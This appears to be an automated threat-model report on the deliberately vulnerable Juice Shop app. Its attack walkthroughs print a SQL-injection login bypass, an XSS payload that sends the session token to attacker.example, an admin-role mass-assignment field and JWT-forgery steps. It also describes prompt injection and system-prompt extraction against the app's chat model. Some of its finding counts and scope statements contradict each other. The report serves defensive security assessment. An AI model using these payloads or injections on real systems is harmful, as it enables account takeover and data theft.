## Management Summary

### Verdict

🔴 Juice Shop is not production-ready. An unauthenticated attacker can bypass authentication, forge any user's session, and read or modify any customer's data through multiple independent Critical paths.

**Risk distribution:** 🔴 Critical: 10 · 🟠 High: 27 · 🟡 Medium: 15 · 🟢 Low: n/a · **Total: 52**<br/>**Reporting threshold:** medium - Low and Informational excluded<br/>**Assessment evidence:** 47 confirmed-exploitable finding(s) · 1 implementation weakness(es) · 7 design weakness(es)


**Scope:** 6 of 7 components received full STRIDE analysis - the externally-reachable, authentication-bearing, and business-critical surface. 1 further component(s) received a reduced-budget screening pass (all six STRIDE categories, no verification greps) and are marked `Screened` in the component table. (see [§1 Scope](#scope)).


**Basis:** a code-derived threat model at implementation level - built from repository evidence, not a planning document. Design intent, business processes, runtime behaviour and production-only configuration are outside what this analysis can see (see [§11 Out of Scope](#11-out-of-scope)).

<br/>

**What an attacker can do today, worst first:**

<blockquote style="border-left: 3px solid #dc2626; background: #fef2f2; padding: 16px 20px; margin: 0;">

- **Full admin takeover via `token` forgery** — Any account holder can forge an admin-role session using the signing key committed to source. *(🔴 [F-004](#f-004) — Hardcoded RSA private key enables arbitrary JWT forgery (`lib/insecurity.ts:21`), 🔴 [F-005](#f-005) — Insecure JWT Verification → [W-003](#w-003))* — ✓ verified attack path
- **Authentication bypass via login injection** — A crafted email field on the login form returns the admin account without a valid password. *(🔴 [F-003](#f-003) — SQL injection in login query bypasses authentication (`routes/login.ts:34`), 🔴 [F-006](#f-006) — SQL injection via email string interpolation in login (`routes/login.ts:34`) → [W-001](#w-001))*
- **Admin account via open registration** — Posting an extra `role` field during self-registration writes a permanent admin to the database. *(🔴 [F-011](#f-011) — Mass assignment privileged field accepted from request body `routes/verify.ts:53`)* — ✓ verified attack path
- **Customer sessions stolen via stored script** — A script stored in a product review executes in every visitor's browser and reads their stored session. *(🔴 [F-009](#f-009) — Cross-Site Scripting (XSS), 🔴 [F-010](#f-010) — JWT Bearer Token Stored in localStorage (`login.component.ts:101`))* — ✓ verified attack path
- **Other users' orders and payments readable** — Authenticated users reach any other customer's addresses, cards, and orders by changing the ID in the request. *(🔴 [F-008](#f-008) — Insecure Direct Object Reference → [W-002](#w-002))*
- **Payment cards stored without encryption** — Card numbers are written to the database as plain integers, readable by anyone who accesses the database file. *(🟠 [F-027](#f-027) — Payment card numbers stored as unencrypted INTEGER (`models/card.ts:39`))*

</blockquote>

<br/>

Replacing the committed signing key and fixing the login form's query construction blocks the two highest-impact chains; moving session tokens to protected browser storage closes the scripted session theft path.

### Top Weaknesses

The systemic root-cause problems behind the findings - the classes to fix, not just individual bugs. Each links to the full [Weakness Register](#7-weakness-register) with its findings and remediation.

- 🔴 **[W-001](#w-001) - Database access relies on concatenated queries** (Critical) - Database queries are assembled from application values instead of passing those values through an enforced parameterised data-access path. _Proven by [F-003](#f-003), [F-006](#f-006), [F-007](#f-007)._
- 🔴 **[W-002](#w-002) - `Authorization` is implemented route by route** (Critical) - `Authorization` depends on per-handler checks instead of a policy boundary that consistently enforces `role`, ownership, and tenant scope. _Proven by 🔴 [F-008](#f-008), 🔴 [F-026](#f-026), 🔴 [F-037](#f-037) (+1 more)._
- 🔴 **[W-003](#w-003) - Secrets are committed to source instead of a managed store** (Critical) - Cryptographic keys, credentials, and other high-entropy secrets are embedded as literals in source or `config` rather than resolved at runtime from a managed secret store, so anyone with repository r… _Proven by 🔴 [F-004](#f-004), 🔴 [F-012](#f-012), 🔴 [F-028](#f-028)._
- 🟠 **[W-004](#w-004) - Endpoints are reachable without enforced authentication** (High) - Sensitive API routes and real-time channels are exposed without an enforced authentication check at the endpoint boundary. _Proven by [F-015](#f-015), [F-035](#f-035), [F-036](#f-036)._
- 🟠 **[W-005](#w-005) - Input handling lacks enforced boundary validation** (High) - Request handlers do not validate input against one enforced server-side schema or allowlist at the boundary - validation is either absent on the vulnerable parameters or limited to rejecting select… _Proven by [F-018](#f-018), [F-019](#f-019)._

### Security Posture & Top Threats

**Figure 1 - Architecture & Top Threats**

Architecture tiers top-to-bottom (External Actors → Client → Application → Data) with the top threats per component. The in-figure legend on the right explains the attack scenarios, severity dots and symbols. Dashed slate lines mark trust-boundary crossings, labelled with the `tb-N` ids catalogued in [§1 Trust Boundaries](#trust-boundaries).

![Figure 1 - Architecture & Top Threats](threat-model-juice-shop-standard-req-v0.6.0b2.figure1.svg)

**Figure 2 - Risk Flow: Actor → Tier → Impact**

Heatmap: **actors** (left) → **architecture tiers** (middle, Client → Application → Data) → **impact** (right). Numbered red arrows ①–⑥ are the threats enumerated in the Top Threats table below.

![Figure 2 - Risk Flow: Actor to Tier to Impact](threat-model-juice-shop-standard-req-v0.6.0b2.figure2.svg)

**Threat actors.** The actors below drive the numbered attack paths in the figures above. The **Shop User** is the *victim* of client-side attacks (XSS / CSRF), not an attacker - in Figure 2 the compromise surfaces as the resulting business-impact node rather than as a separate actor box.

- **Shop User** — legitimate customer; target of client-side attacks; target of ④ Output Encoding / Cross-Site Scripting, ⑥ CSRF / Permissive CORS.
- **Anonymous Internet Attacker** — no account; registers in seconds when needed; drives ① Hardcoded Secrets & Weak Cryptography, ② Insecure Query Construction & Data Access, ③ Broken `Authorization` & Access Control.
- **Authenticated Internet Attacker** — owns a regular account; logged in; drives ⑤ Sensitive File & Secret Exposure.

**6 structural threats**, grouped by weakness class - each row is one threat, not one finding. *Threat Description* states the general architectural weakness (STRIDE in brackets); *Findings* lists the concrete instances, each linked to [§8 Findings Register](#8-findings-register) with its component; *Risk & Impact* combines severity with business consequence.

_STRIDE: S spoofing · T tampering · R repudiation · I information disclosure · D denial of service · E elevation of privilege. Risk, findings, components, impact and Fix are derived deterministically; only the one-line weakness description is authored._

**Verified attack chains.** 5 fully viable ([AC-T-001](#ac-t-001), [AC-T-003](#ac-t-003), [AC-T-004](#ac-t-004), [AC-T-005](#ac-t-005), [AC-T-007](#ac-t-007)); 1 partially blocked ([AC-T-002](#ac-t-002)). These chains combine individual findings into end-to-end exploitation paths verified step-by-step against the code - see [§9 Abuse Cases](#9-abuse-cases) for the per-step breakdown and blocking mitigations.

### AI / LLM Exposure

The Express backend exposes a tool-calling LLM chat endpoint at `/rest/chat` that proxies to an Ollama or OpenAI-compatible provider; user messages are passed unfiltered to the model context and the model is authorized to execute server-side coupon tools. See **[§6 Security Architecture](#6-security-architecture)** for the per-control detail.



- **[LLM01](https://genai.owasp.org/llmrisk/llm01/) / [ASI01](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/) Prompt Injection** — User messages are concatenated into the LLM prompt at `routes/chat.ts:191` without `role` separation or content filtering. An attacker submitting instruction-format text in a chat turn can override the system-prompt escalation policy and redirect the model to execute privileged tool actions. _([C-01](#c-01) — Express REST API)_
  - ↳ 🟠 [F-020](#f-020) — Prompt injection via unfiltered user messages in chat route (`chat.ts:191`)

- **[LLM06](https://genai.owasp.org/llmrisk/llm06/) / [ASI02](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/) Excessive Agency** — The chat endpoint at `server.ts:638` is reachable without authentication, and the coupon-redemption tool it exposes runs with the application's full authority. An unauthenticated caller can trigger coupon tool execution by submitting a crafted message, bypassing all payment logic. _([C-01](#c-01) — Express REST API)_
  - ↳ 🔴 [F-036](#f-036) — Unauthenticated chat endpoint enables coupon tool execution (`server.ts:638`)

- **[LLM07](https://genai.owasp.org/llmrisk/llm07/) System Prompt Leakage** — The system prompt at `routes/chat.ts:105` contains the application's coupon escalation policy as literal text. Because prompt injection cannot be reliably blocked by delimiters, an attacker who successfully injects can instruct the model to repeat the system prompt, exposing business-logic rules that should be enforced server-side. _([C-01](#c-01) — Express REST API)_
  - ↳ 🟠 [F-025](#f-025) — Confidential escalation policy in system prompt extractable via injection (`chat.ts:105`)

- **[LLM05](https://genai.owasp.org/llmrisk/llm05/) / [ASI05](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/) Improper Output Handling** — The product-review lookup tool at `routes/chat.ts:149` passes the model's output directly into a MarsDB selector using the `$where` operator. Attacker-controlled product identifiers returned by the model can carry JavaScript expressions that execute server-side inside the database query. _([C-01](#c-01) — Express REST API)_
  - ↳ 🔴 [F-022](#f-022) — NoSQL \$where JS injection in chat product reviews tool (`chat.ts:149`)

- **[LLM10](https://genai.owasp.org/llmrisk/llm10/) / [ASI08](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/) Unbounded Consumption** — No per-IP, per-user, or global rate limit is applied to the chat endpoint registered at `server.ts:638`. Any caller — including unauthenticated ones — can issue unlimited requests to the upstream LLM provider, leading to unbounded inference cost and potential service denial for other users. _([C-01](#c-01) — Express REST API)_
  - ↳ 🟠 [F-031](#f-031) — No rate limiting on chat endpoint enables unbounded LLM cost (`server.ts:638`)

## 1. System Overview

**Repository:** `https://github.com/juice-shop/juice-shop.git`

### Scope

This threat model covers 7 components of juice-shop3: **Express REST API**, **Authentication and Session Management**, **Angular Frontend SPA**, **Socket\.IO Real-Time Service**, **SQLite Data Store (Sequelize ORM)**, **GitHub Actions CI/CD Pipeline**, **Web3 / Wallet / NFT Surface**.

All 7 modeled components received full STRIDE threat analysis.

**Out of scope:** third-party hosted dependencies, browser runtime, operating-system kernel, and the underlying network infrastructure.

**Basis:** a code-derived threat model at implementation level, built from source, configuration and git history. It describes the system as built, not as designed.

---

### Trust Boundaries

Canonical boundary crossings. **Assumption & verdict** names the condition that makes each crossing safe and whether this report still supports it, judged one condition at a time - which conditions apply follows from the direction of the crossing.

_Exposure, most exposed first: ⚠ Review (endpoints unresolved) · 🌐 External (reached from outside the model) · ◐ Unverified (crossing not confirmed) · 🔒 Internal (both ends modelled) · ↗ Egress (reaches outside the model)._

_Kind - the crossing mechanism (build pipeline, in-process, network), then after `·` what changes across it: data-origin, identity, operator, privilege, tenant. Shown alone, nothing changes._

_Conditions - **inbound**: validation, authentication, authorization · **outbound**: egress content, egress destination, response trust (replies are untrusted input) · **internal**: query construction (data never becomes program text), authentication, authorization._

_Verdict per condition - **broken**: a linked finding proves the gap · in doubt: related findings, `none` linked here · not examined: nothing bears on it. `N related` counts further findings on the same condition. Linked findings sit under the condition they break, or under _Unattributed_. A link raises effective severity only at a confirmed internet ingress; raw risk never changes._

_Identical on every row, so stated once here instead of in a column: source `detected` (derived from inspected repository evidence); status `resolved`. Any row that deviates is shown in the table._

```mermaid
    classDef sys      fill:#f2f2f2,stroke:#424242,color:#111,stroke-width:1.5px
    class USER user
    class ATTACKER attacker
    class ADMIN admin
    class SYSTEM sys
```

*Trust boundaries not named above: external → websocket-rt (tb-3), external → ci-cd-pipeline (tb-5), backend-api → database (tb-6), auth-session → database (tb-7), +1 more - every boundary is listed in [§1 Trust Boundaries](#trust-boundaries).*

**Key takeaway:** Every actor in the context interacts with juice-shop3 through its external interface, so authentication and input validation at that edge govern the entire attack surface.

## 3. Attack Walkthroughs

This section walks through how the **8 highest-priority of 20 Critical findings** are exploited - selected by severity, chain relevance, and threat-category diversity, with Access Control and LLM Abuse represented when present. Each walkthrough has attack steps, a focused sequence diagram, and the primary mitigation. How weaknesses combine toward the worst-case goal is in the [Critical Attack Tree](#critical-attack-tree); every other Critical, plus full per-finding context (severity rationale, assets, detection signals), is in the [§8 Findings Register](#8-findings-register).

### 3.1 Insecure JWT Verification in Express REST API

**Source:** 🔴 [F-005](#f-005) — `lib/insecurity.ts:189`

Severity **Critical** ([CWE-347](https://cwe.mitre.org/data/definitions/347.html)). STRIDE: Spoofing. See [§8 F-005](#f-005) for the full register row.

**Attack Steps**

1. An attacker crafts a request targeting the weak spot at `lib/insecurity.ts:189`.
2. The attacker sends it; the missing control never rejects the crafted input.
3. Without an explicit algorithm allowlist, attackers can forge tokens with `alg:none` (older lib versions) or use the public key as an HMAC secret to mint valid signatures.

**Sequence Diagram**

```mermaid
sequenceDiagram
    autonumber
    actor Attacker
    participant App
    Note over App: backend-api - lib/insecurity.ts:189
    Attacker->>App: The attacker sends a crafted request targeting lib/insecurity.ts line 189
    App->>App: Vulnerable branch executes without the missing control
    App-->>Attacker: The attacker reads the response confirming the weakness - CWE-347
    alt Current state — F-005
        Attacker->>App: The attacker sends the exploit for F-005
        App-->>Attacker: Exploit succeeds
    else After M-005 — Enforce JWT signature and algorithm verification
        Attacker->>App: The attacker retries the same request after the fix
        App-->>Attacker: Request rejected
    end
```

**Key takeaway:** Until ● [M-005](#m-005) (Enforce JWT signature and algorithm verification) lands, 🔴 [F-005](#f-005) — Insecure JWT Verification is exploitable at `lib/insecurity.ts:189` (Critical-severity, [CWE-347](https://cwe.mitre.org/data/definitions/347.html)).

**Defense in Depth**

- Primary mitigation: ● [M-005](#m-005) (Enforce JWT signature and algorithm verification)

### 3.2 SQL injection request data interpolated into a SQL string in Express REST API

**Source:** 🔴 [F-007](#f-007) — `routes/search.ts:23`

Severity **Critical** ([CWE-89](https://cwe.mitre.org/data/definitions/89.html)). STRIDE: Tampering. See [§8 F-007](#f-007) for the full register row.

**Attack Steps**

1. Find the request parameter that reaches the raw query at `routes/search.ts:23`.
2. Interpolating request-controlled text into a SQL statement lets an attacker alter the query - exfiltrating or modifying arbitrary rows, bypassing authentication, or escalating to full database control.

**Sequence Diagram**

```mermaid
sequenceDiagram
    autonumber
    actor Attacker
    participant API
    participant DB
    Note over API: backend-api - routes/search.ts:23
    Note over DB: Database
    Attacker->>API: Crafted HTTP request to the affected endpoint with classical OR 1=1 payload
    API->>DB: SQL built by string interpolation - payload becomes query
    DB-->>API: First matching row regardless of intended predicate
    API-->>Attacker: 200 OK with authenticated session / leaked rows
    alt Current state — F-007
        Attacker->>API: The attacker sends the exploit for F-007
        API-->>Attacker: Exploit succeeds
    else After M-007 — Use parameterized database queries
        Attacker->>API: The attacker retries the same request after the fix
        API-->>Attacker: Request rejected
    end
```

**Key takeaway:** Until ● [M-007](#m-007) (Use parameterized database queries) lands, 🔴 [F-007](#f-007) — SQL injection request data interpolated into a SQL string `routes/search.ts:23` is exploitable at `routes/search.ts:23` (Critical-severity, [CWE-89](https://cwe.mitre.org/data/definitions/89.html)).

**Defense in Depth**

- Primary mitigation: ● [M-007](#m-007) (Use parameterized database queries)

### 3.3 Mass assignment privileged field accepted from request body

**Source:** 🔴 [F-011](#f-011) — `routes/verify.ts:53`

Severity **Critical** ([CWE-915](https://cwe.mitre.org/data/definitions/915.html)). STRIDE: Elevation of Privilege. See [§8 F-011](#f-011) for the full register row.

**Attack Steps**

1. An attacker crafts a request targeting the weak spot at `routes/verify.ts:53`.
2. The attacker simply adds `{"role":"admin"}` to their request to escalate.

**Sequence Diagram**

```mermaid
sequenceDiagram
    autonumber
    actor Attacker
    participant App
    Note over App: backend-api - routes/verify.ts:53
    Attacker->>App: The attacker sends a crafted request targeting routes/verify.ts line 53
    App->>App: Vulnerable branch executes without the missing control
    App-->>Attacker: The attacker reads the response confirming the weakness - CWE-915
    alt Current state — F-011
        Attacker->>App: The attacker sends the exploit for F-011
        App-->>Attacker: Exploit succeeds
    else After M-011 — Allowlist client-controlled fields
        Attacker->>App: The attacker retries the same request after the fix
        App-->>Attacker: Request rejected
    end
```

**Key takeaway:** Until ● [M-011](#m-011) (Allowlist client-controlled fields) lands, 🔴 [F-011](#f-011) — Mass assignment privileged field accepted from request body `routes/verify.ts:53` is exploitable at `routes/verify.ts:53` (Critical-severity, [CWE-915](https://cwe.mitre.org/data/definitions/915.html)).

**Defense in Depth**

- Primary mitigation: ● [M-011](#m-011) (Allowlist client-controlled fields)

### 3.4 SQL injection in login query bypasses authentication

**Source:** 🔴 [F-003](#f-003) — `routes/login.ts:34`

Severity **Critical** ([CWE-89](https://cwe.mitre.org/data/definitions/89.html)). STRIDE: Spoofing. See [§8 F-003](#f-003) for the full register row.

**Attack Steps**

1. Attacker sends POST `/rest/user/login` with body `{"email":"' OR '1'='1'--","password":"x"}` requiring no prior authentication.
2. Sequelize executes the interpolated query `SELECT * FROM Users WHERE email = '' OR '1'='1'--' AND password = '<md5>'`, which matches the first row regardless of password.
3. Server calls `afterLogin` with the returned user record and issues a valid 6-hour JWT, granting an attacker a full authenticated session.
4. Attacker repeats with targeted email values to authenticate as any specific account without knowing its password.

**Sequence Diagram**

```mermaid
sequenceDiagram
    autonumber
    actor Attacker
    participant API
    participant DB
    Note over API: auth-session - routes/login.ts:34
    Note over DB: Database
    Attacker->>API: POST /rest/user/login with classical OR 1=1 payload
    API->>DB: SQL built by string interpolation - payload becomes query
    DB-->>API: First matching row regardless of intended predicate
    API-->>Attacker: 200 OK with authenticated session / leaked rows
    alt Current state — F-003
        Attacker->>API: The attacker sends the exploit for F-003
        API-->>Attacker: Exploit succeeds
    else After M-003 — Use parameterized database queries
        Attacker->>API: The attacker retries the same request after the fix
        API-->>Attacker: Request rejected
    end
```

**Key takeaway:** Until ● [M-003](#m-003) (Use parameterized database queries) lands, 🔴 [F-003](#f-003) — SQL injection in login query bypasses authentication (`routes/login.ts:34`) is exploitable at `routes/login.ts:34` (Critical-severity, [CWE-89](https://cwe.mitre.org/data/definitions/89.html)).

**Defense in Depth**

- Primary mitigation: ● [M-003](#m-003) (Use parameterized database queries)

### 3.5 Cross-Site Scripting (XSS) in Search Result

**Source:** 🔴 [F-009](#f-009) — `frontend/src/app/search-result/search-result.component.ts:143`

Severity **Critical** ([CWE-79](https://cwe.mitre.org/data/definitions/79.html)). STRIDE: Tampering. See [§8 F-009](#f-009) for the full register row.

**Attack Steps**

1. Attacker crafts /#`/search?q=<img` `src=x` onerror='fetch("//attacker.example/"+`localStorage.token`)'> and delivers it via phishing email or shortened URL.
2. Victim navigates to the URL; Angular router populates `queryParams.q` with the payload string and calls `filterTable()`.
3. `filterTable()` calls `bypassSecurityTrustHtml(queryParam)` at line 143; Angular skips sanitization and renders the payload into the DOM.
4. The onerror handler executes, reads the JWT bearer `token` from `localStorage`, and transmits it to an attacker - full account takeover without user credentials.

**Sequence Diagram**

```mermaid
sequenceDiagram
    autonumber
    actor Attacker
    actor Victim
    participant App
    Note over App: frontend-spa - frontend/src/app/search-result/search-result.component.ts:143
    Attacker->>App: Crafted search query (HTML payload in `q=` parameter) with HTML payload - onerror handler exfiltrates cookies
    Victim->>App: Loads page rendering the stored / reflected payload
    App-->>Victim: HTML contains the unescaped attacker payload - script executes
    Victim->>Attacker: Outbound request leaks session cookie / token
    alt Current state — F-009
        Attacker->>App: The attacker sends the exploit for F-009
        App-->>Attacker: Exploit succeeds
    else After M-009 — Encode output instead of bypassing the framework sanitizer
        Attacker->>App: The attacker retries the same request after the fix
        App-->>Attacker: Request rejected
    end
```

**Key takeaway:** Until ● [M-009](#m-009) (Encode output instead of bypassing the framework sanitizer) lands, 🔴 [F-009](#f-009) — Cross-Site Scripting (XSS) is exploitable at `frontend/src/app/search-result/search-result.component.ts:143` (Critical-severity, [CWE-79](https://cwe.mitre.org/data/definitions/79.html)).

**Defense in Depth**

- Primary mitigation: ● [M-009](#m-009) (Encode output instead of bypassing the framework sanitizer)

### 3.6 JWT Bearer Token Stored in localStorage

**Source:** 🔴 [F-010](#f-010) — `frontend/src/app/login/login.component.ts:101`

Severity **Critical** ([CWE-922](https://cwe.mitre.org/data/definitions/922.html)). STRIDE: Information Disclosure. See [§8 F-010](#f-010) for the full register row.

**Attack Steps**

1. Attacker exploits any confirmed XSS sink - for example, the ?q= URL parameter at `search-result.component.ts:143` - by sending a crafted URL to a logged-in victim.
2. Injected script calls `localStorage.getItem('token')` and transmits the value to an attacker-controlled endpoint.
3. Attacker adds the JWT as an `Authorization`: Bearer header and calls any `/rest/*` or `/api/*` endpoint.
4. Attacker performs any action the victim is authorized for, including reading personal data, placing orders, and changing account details - session is fully compromised without re-authentication.

**Sequence Diagram**

```mermaid
sequenceDiagram
    autonumber
    actor Attacker
    participant App
    Note over App: frontend-spa - frontend/src/app/login/login.component.ts:101
    Attacker->>App: The attacker sends a crafted request targeting frontend/src/app/login/login.component.ts line 101
    App->>App: Vulnerable branch executes without the missing control
    App-->>Attacker: The attacker reads the response confirming the weakness - CWE-922
    alt Current state — F-010
        Attacker->>App: The attacker sends the exploit for F-010
        App-->>Attacker: Exploit succeeds
    else After M-010 — Store session tokens in HttpOnly, Secure cookies
        Attacker->>App: The attacker retries the same request after the fix
        App-->>Attacker: Request rejected
    end
```

**Key takeaway:** Until ● [M-010](#m-010) (Store session tokens in HttpOnly, Secure cookies) lands, 🔴 [F-010](#f-010) — JWT Bearer Token Stored in localStorage (`login.component.ts:101`) is exploitable at `frontend/src/app/login/login.component.ts:101` (Critical-severity, [CWE-922](https://cwe.mitre.org/data/definitions/922.html)).

**Defense in Depth**

- Primary mitigation: ● [M-010](#m-010) (Store session tokens in HttpOnly, Secure cookies)

### 3.7 Hardcoded RSA private key enables arbitrary JWT forgery

**Source:** 🔴 [F-004](#f-004) — `lib/insecurity.ts:21`

Severity **Critical** ([CWE-321](https://cwe.mitre.org/data/definitions/321.html)). STRIDE: Spoofing. See [§8 F-004](#f-004) for the full register row.

**Attack Steps**

1. Attacker clones the public repository and extracts the RSA private key literal from `lib/insecurity.ts:21`.
2. Attacker constructs a JWT payload containing `role:admin` and any target user email, then signs it with the extracted key using `RS256`.
3. Attacker sends the forged `token` in the `Authorization` header to any protected endpoint (e.g., `/api/Users/`) and receives full admin access.
4. Attacker issues replacement tokens for any existing account, bypassing 2FA and all session controls permanently.

**Sequence Diagram**

```mermaid
sequenceDiagram
    autonumber
    actor Attacker
    participant Repo
    participant App
    Note over Repo: Public repository
    Note over App: auth-session - lib/insecurity.ts:21
    Attacker->>Repo: Clone or browse - extract private key from lib/insecurity.ts line 21
    Attacker->>Attacker: Sign forged token / signature with the extracted key
    Attacker->>App: Submit forged artefact in normal authentication flow
    App-->>Attacker: Request accepted as authentic - signature validates
    alt Current state — F-004
        Attacker->>Repo: The attacker sends the exploit for F-004
        Repo-->>Attacker: Exploit succeeds
    else After M-004 — Move cryptographic keys to a managed secret store
        Attacker->>Repo: The attacker retries the same request after the fix
        Repo-->>Attacker: Request rejected
    end
```

**Key takeaway:** Until ● [M-004](#m-004) (Move cryptographic keys to a managed secret store) lands, 🔴 [F-004](#f-004) — Hardcoded RSA private key enables arbitrary JWT forgery (`lib/insecurity.ts:21`) is exploitable at `lib/insecurity.ts:21` (Critical-severity, [CWE-321](https://cwe.mitre.org/data/definitions/321.html)).

**Defense in Depth**

- Primary mitigation: ● [M-004](#m-004) (Move cryptographic keys to a managed secret store)

### 3.8 LLM06 Unauthenticated chat endpoint enables coupon tool execution without aut…

**Source:** 🔴 [F-036](#f-036) — `server.ts:638`

Severity **High** ([CWE-306](https://cwe.mitre.org/data/definitions/306.html)). STRIDE: Elevation of Privilege. See [§8 F-036](#f-036) for the full register row.

**Attack Steps**

1. An attacker crafts a request targeting the weak spot at `server.ts:638`.
2. LLM06 Excessive Agency: an unauthenticated attacker sends POST `/rest/chat` without any authentication `token`; `server.ts:638` registers the endpoint with no `isAuthorized()` middleware; the attacker crafts a prompt that satisfies the system prompt's coupon policy conditions and causes the model to invoke the `generateCoupon` tool at `routes/chat.ts:181`, which generates a valid discount coupon code via `security.generateCoupon` without any user identity check or authorization.

**Sequence Diagram**

```mermaid
sequenceDiagram
    autonumber
    actor Attacker
    participant App
    Note over App: backend-api - server.ts:638
    Attacker->>App: The attacker sends a crafted request targeting server.ts line 638
    App->>App: Vulnerable branch executes without the missing control
    App-->>Attacker: The attacker reads the response confirming the weakness - CWE-306
    alt Current state — F-036
        Attacker->>App: The attacker sends the exploit for F-036
        App-->>Attacker: Exploit succeeds
    else After M-036 — Require authentication on every exposed endpoint
        Attacker->>App: The attacker retries the same request after the fix
        App-->>Attacker: Request rejected
    end
```

**Key takeaway:** Until ◕ [M-036](#m-036) (Require authentication on every exposed endpoint) lands, 🔴 [F-036](#f-036) — LLM06 Unauthenticated chat endpoint enables coupon tool execution without autho… is exploitable at `server.ts:638` (High-severity, [CWE-306](https://cwe.mitre.org/data/definitions/306.html)).

**Defense in Depth**

- Primary mitigation: ◕ [M-036](#m-036) (Require authentication on every exposed endpoint)

## 4. Assets

Information assets and the classification level that drives the Confidentiality / Integrity / Availability targets used in [§8 Findings Register](#8-findings-register) risk scoring.

| Asset | Classification | Description |
|----------------------|--------------|------------------------------------|
| JWT Signing Secret | Restricted | The server-side secret used to sign and<br/>verify all bearer JWTs, configured via<br/>`config/default.json`. Compromise of this<br/>secret allows arbitrary `token` forgery and<br/>full authentication bypass for all user<br/>accounts including admin. |
| Browser-Stored JWT Session Tokens | Restricted | Bearer JWTs persisted in browser<br/>`localStorage` by the Angular SPA<br/>(`basket.service.ts:64`,<br/>`request.interceptor.ts:13`). Exposed to XSS<br/>exfiltration and physical-device access<br/>because they are not stored in HttpOnly<br/>cookies. |
| CI/CD Pipeline Secrets and Workflow Tokens | Restricted | GitHub Actions `GITHUB_TOKEN`, npm publish<br/>credentials, and any secrets injected into<br/>the CI environment (`ci.yml`, `release.yml`).<br/>Tag-pinned third-party actions and public-PR<br/>CI exposure create supply-chain compromise<br/>paths to these secrets. |
| User Credentials and PII | Confidential | User email addresses, bcrypt-hashed<br/>passwords, security questions and answers,<br/>and profile data stored in the SQLite<br/>database user model. Targeted by<br/>account-takeover, credential-stuffing, and<br/>SQL-injection attacks against the<br/>authentication endpoints. |
| SQLite Database File | Confidential | The on-disk SQLite file holding all user,<br/>product, order, challenge, and session data<br/>for the application instance. Direct file<br/>read by any process sharing the container<br/>filesystem yields all application data in<br/>plaintext. |
| Product and Order Data | Internal | Product catalog, pricing, customer orders,<br/>basket contents, delivery status, and<br/>payment card references stored in SQLite<br/>tables. Integrity matters for commerce-logic<br/>challenges; several write endpoints lack<br/>authorization checks. |
| Challenge State and Exploit Evidence | Internal | Per-user challenge completion flags, TOTP<br/>secrets, continue-codes, and<br/>hacking-instructor progress stored in the<br/>SQLite challenge and hint tables.<br/>Manipulation allows score falsification<br/>without solving challenges. |
| Application Source Code and Configuration | Internal | TypeScript source, Angular frontend bundle,<br/>and runtime configuration<br/>(`config/default.json`, .env). Contains<br/>deliberately embedded vulnerabilities as<br/>pedagogical content; bundled test credential<br/>in `login.component.ts:62` is a hardcoded<br/>secret. |

## 6. Security Architecture

This chapter is organized by security-control category. The architecture section avoids artificial control IDs and finding-ID columns in overview tables. Findings are listed only where the affected control is described.

_[§6](#6-security-architecture) schema v2 (13-section control-category layout). Cataloged controls: 22 total - 2 adequate, 4 partial, 7 weak, 4 unsafe, 5 missing. Linked threats: 53._

**How to read the verdicts.** Every control category (and every sub-control below it) carries exactly one status. The two red verdicts do **not** mean the same thing - this is the distinction that decides what you have to do about a finding:

| Status | Meaning | What it asks of you |
|----------|------------------------------------|------------------------|
| 🟢 Adequate | Control is present and sound | Nothing - keep it |
| 🟡 Partial | Present, but with meaningful gaps | Close the gap |
| 🟠 Weak | Present, but has exploitable gaps | Strengthen it |
| 🔴 Unsafe | **Present and relied upon, but defeated /<br/>trivially bypassable** | **Fix the existing control** |
| 🔴 Missing | **Control was never built** | **Add the control** |
| - | Not applicable to this codebase | - |

So "🔴 Unsafe" on a control category does *not* mean the control is absent - it means the control exists but does not hold (e.g. an `MD5` password `hash`, a raw-SQL query path, a hardcoded signing key). "🔴 Missing" is reserved for controls that were never built (e.g. no `Content-Security-Policy` header).

### 6.2 Identity and Authentication Controls

<a id="ctrl-identity-and-authentication-controls"></a>

**Systemic weaknesses:** [W-004](#w-004)

<!-- The line below is mechanically derived from the controls table — LLM must not re-author it. -->
**Controls covered:**

- [6.2.1 OAuth 2.0 Flow](#621-oauth-20-flow)

**Implemented controls:** `lib/insecurity.ts`; `lib/insecurity.ts`, models/; frontend/src/app/; `server.ts`, `lib/insecurity.ts`.

**Assessment:** Every authentication mechanism in this codebase is present but defeated. The RSA signing key is committed to source, the JWT verifier accepts attacker-chosen algorithms, login queries are injectable, OAuth uses the insecure implicit flow without state, and no rate limiting covers any authentication endpoint. The result is that multiple independent Critical paths exist for full authentication bypass without prior credentials. Each successful authentication flow terminates in the server issuing a session `token`; the storage, propagation, and lifecycle of that `token` are described in [§6.3 Session and Token Controls](#63-session-and-token-controls).
